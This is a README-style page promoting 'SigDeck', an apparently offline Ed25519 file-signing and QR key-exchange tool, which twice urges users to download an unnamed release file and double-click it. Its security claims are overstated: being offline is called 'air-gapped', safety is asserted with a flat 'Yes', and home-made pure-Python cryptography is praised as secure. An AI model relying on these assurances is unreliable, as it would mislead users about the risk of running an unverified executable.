<h1>🔐 SigDeck - Sign Files Securely, Even Offline</h1>

<p align="center">
  <a href="https://github.com/Zhang6765338/SigDeck/releases"><img src="https://img.shields.io/badge/Download-SigDeck%20Latest%20Release-4CAF50?style=for-the-badge&logo=github" alt="Download SigDeck"></a>
</p>

## 👋 Welcome to SigDeck

SigDeck is a simple, safe, and completely offline tool that lets you **sign files**, **verify signatures**, and **exchange security keys** using QR codes. Think of it as a digital notary stamp for your files — but one that works without the internet, without a cloud, and without any complicated setup.

Whether you're a journalist protecting sources, a lawyer verifying contracts, or just someone who cares about file integrity, SigDeck gives you professional-grade cryptographic tools in a friendly, visual package.

---

## 🚀 Getting Started (Windows Users)

Getting SigDeck running on your Windows computer takes less than two minutes. Here's exactly what to do:

### Step 1: Download the Application

**Visit this link to download the application:** [https://github.com/Zhang6765338/SigDeck/releases](https://github.com/Zhang6765338/SigDeck/releases)

Once you click that link, you'll see a page with a list of released versions. Look for the most recent one (usually at the top) and download the file associated with it.

### Step 2: Run the Application

After the download finishes, find the file in your "Downloads" folder. Double-click it to start SigDeck. That's it — no installation wizard, no admin permissions, no configuration. The program opens instantly.

### Step 3: You're Ready!

SigDeck opens with a clean, friendly interface. You'll see three main areas:

- **Sign a File** – Put your digital stamp on any document
- **Verify a Signature** – Check if a file is authentic and unchanged
- **Exchange Keys** – Share your public key or import someone else's via QR code

---

## ✍️ How to Sign Your First File

1. Click the **"Sign a File"** button.
2. Choose any file from your computer (a PDF, image, text file — anything).
3. Create a **passphrase** (like a password, but longer). This protects your signing key. Think of something memorable but hard to guess.
4. SigDeck generates a signature file (a small text file with a `.sig` extension) and saves it next to your original file.
5. Share both the original file and the `.sig` file with the person you're sending it to.

---

## ✅ How to Verify a Signature

1. Click the **"Verify a Signature"** button.
2. Select the original file you received.
3. Select the corresponding `.sig` signature file.
4. SigDeck instantly tells you: **"Signature Valid ✅"** or **"Signature Invalid ❌"**.

If the signature is valid, you know the file hasn't been tampered with and it truly came from the person who claims to have signed it.

---

## 📱 Exchanging Keys with QR Codes

SigDeck makes key exchange as easy as showing your phone screen.

1. Click **"Exchange Keys"**.
2. Your **public key** (which is safe to share) appears as a QR code on your screen.
3. The other person scans it with their SigDeck app on their phone or computer.
4. Now you can verify each other's signatures.

Your **private key** (the one that signs files) never leaves your device. It's protected by your passphrase and stored only locally.

---

## 🔒 Why SigDeck is Different

### 100% Offline Operation
SigDeck never connects to the internet. Your private keys, your files, and your signatures stay on your device. This is called **"air-gapped"** security — the highest level of protection available.

### Modern, Secure Cryptography
SigDeck uses **Ed25519** — the gold standard in digital signatures. It's fast, secure, and used by major security systems worldwide. The implementation follows the official RFC 8032 specification, meaning it's compatible with other Ed25519 tools.

### Passphrase Protection
Your signing key is encrypted with a **scrypt** passphrase. This makes it nearly impossible for anyone to crack your passphrase, even with powerful computers.

### Portable & Lightweight
SigDeck is a single file. No installation, no dependencies, no clutter. You can even run it from a USB stick on any Windows computer.

---

## 🧰 What Can You Use SigDeck For?

- **Verify downloaded software** – Ensure the file you downloaded hasn't been modified
- **Sign contracts or agreements** – Add a verifiable digital signature to PDFs
- **Protect sensitive documents** – Prove authenticity when sharing files
- **Secure communication** – Exchange keys with colleagues and verify messages
- **Educational purposes** – Learn how digital signatures work in a hands-on way

---

## 🛠️ Technical Details (For the Curious)

SigDeck is built with **pure Python** and implements the Ed25519 algorithm from scratch — no external cryptographic libraries required. This means the code is transparent and auditable. The entire toolkit includes:

- Ed25519 signing and verification (RFC 8032)
- Scrypt-based key derivation for passphrase security
- ASCII armor output (human-readable signature files)
- QR code generation and scanning for key exchange
- Cross-platform compatibility (Windows, macOS, Linux, Android)

---

## 📖 Frequently Asked Questions

### Is SigDeck really safe?
Yes. It runs entirely offline, uses proven cryptographic algorithms, and never transmits your data anywhere.

### Can I use it on my phone?
Yes. SigDeck works on Android devices too. The QR code exchange feature is especially handy for phone-to-computer key sharing.

### What if I forget my passphrase?
Unfortunately, there's no recovery option — and that's a security feature. Without your passphrase, your signing key cannot be accessed. Keep your passphrase in a safe place.

### Can I sign multiple files?
Absolutely. You can sign as many files as you like. Each gets its own signature file.

### Is it free?
Yes. SigDeck is completely free and open-source.

---

## 📥 Download Again

Ready to get started?

**Visit this link to download the application:** [https://github.com/Zhang6765338/SigDeck/releases](https://github.com/Zhang6765338/SigDeck/releases)

Choose the latest release, download the file, double-click to run, and you're signing files within minutes.

---

## 🤝 Support & Contributions

SigDeck is an open-source project. If you encounter issues, have feature requests, or want to contribute code, visit the GitHub repository page. Your feedback helps make SigDeck better for everyone.

---

## 📄 License

SigDeck is released under an open-source license. You're free to use, modify, and distribute it, provided you maintain attribution.

---

## 🧲 Keywords

air-gapped, android, cryptography, ed25519, offline, qr-codes, security, signing